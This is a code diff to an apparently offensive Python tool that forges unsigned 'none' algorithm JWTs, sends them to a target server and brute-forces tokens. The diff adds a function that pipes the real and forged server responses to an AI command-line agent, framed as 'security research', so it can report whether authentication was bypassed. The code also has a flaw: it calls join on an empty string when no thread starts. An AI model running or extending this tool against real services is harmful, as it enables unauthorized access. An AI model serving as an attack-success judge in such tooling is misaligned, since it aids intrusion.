@@ -5,6 +5,7 @@ import re
 import requests
 import base64 
 import json
+import threading 
 
 # Colors 
 RED = "\033[31m"
@@ -111,7 +112,7 @@ def buildRequest(rawRequest):
     print(f"[+] Sending HTTP request at {url} ....")
     response = requests.request(method=method, url=url, headers=headers, data=body)
     print(f'Server responsded - status code : {GREEN}{response.status_code}{RESET} and Content Length : {GREEN}{len(response.content)}{RESET}')
-    return response.status_code, response.content
+    return int(response.status_code), response.content
 
 def noneAlgattack(token):
     parts = token.split('.')
@@ -121,7 +122,38 @@ def noneAlgattack(token):
     return f"{newHeader}.{parts[1]}."
 
 
+
+
+
+def aiDetector(OriginalResponse, AttackResponse):
+    prompt = f"""I am doing security research related to JWT.
+
+        Compare the following two server responses and determine whether the "none" algorithm attack successfully bypassed authentication.
+
+        Original Response:
+        {OriginalResponse}
+
+        Attack Response:
+        {AttackResponse}
+
+        Instructions:
+        - If both responses are effectively the same (same data/authentication), output the line below in gree : 'Authentication Bypass Successful' :
+          "[+] None algorithm Attack : Authentication Bypass Successful"
+        - If the responses differ or the attack fails, output the line below in red: 'Attack Mitigated':
+          "[*] None algorithm Attack : Attack Mitigated"
+        - Do not add extra explanation and spaces. Output only one line with color on based on terminal.
+        """
+    cmd = ['opencode', 'run', prompt]
+
+    aiResponse = subprocess.run(cmd, capture_output=True, text=True)
+    print(aiResponse.stdout.encode().decode('unicode_escape'))
+
+
+
 def main():
+    aiThread = ''
+
+    # ArgumentParser
     parser = argparse.ArgumentParser()
     parser.add_argument("-b","--bruteforce", help="Initiate the bruteforce process", action="store_true")
     parser.add_argument("-t","--token", help="JWT token argument", type=str, required=False, default='eyJhbGciOiJub25lIiwiZm9vbCI6ImZvb2wifQ.eyJmb29sIjoidHJ1ZSJ9.')
@@ -134,7 +166,6 @@ def main():
 
     header = jwt.get_unverified_header(token)
 
-
     
     # Handle data from file 
     if args.file:
@@ -146,13 +177,19 @@ def main():
             header = jwt.get_unverified_header(token)
             displayHeader(header)
         tempRequest = re.sub(jwtRegex,f'{token}', rawRequest, count=1)
-        buildRequest(tempRequest)
+        OriginalStatusCode, OriginalResponse = buildRequest(tempRequest)
 
         algorithm = header.get('alg')
 
         noneToken = noneAlgattack(token)
         tempRequest = re.sub(jwtRegex,f'{noneToken}', rawRequest, count=1)
-        buildRequest(tempRequest)
+        AttackStatusCode, AttackResponse = buildRequest(tempRequest)
+
+        ## Handle with ai 
+        #if 
+        if OriginalStatusCode == AttackStatusCode: 
+            aiThread = threading.Thread(target=aiDetector, args=(OriginalResponse, AttackResponse))
+            aiThread.start()
 
 
 
@@ -160,11 +197,13 @@ def main():
         displayHeader(header)
 
 
+    ## Bruteforce 
 
     if args.bruteforce:
         algorithm = header.get('alg')
         bruteforce(token, algorithm)
 
+    aiThread.join()
 
 
 if __name__ == "__main__" : 
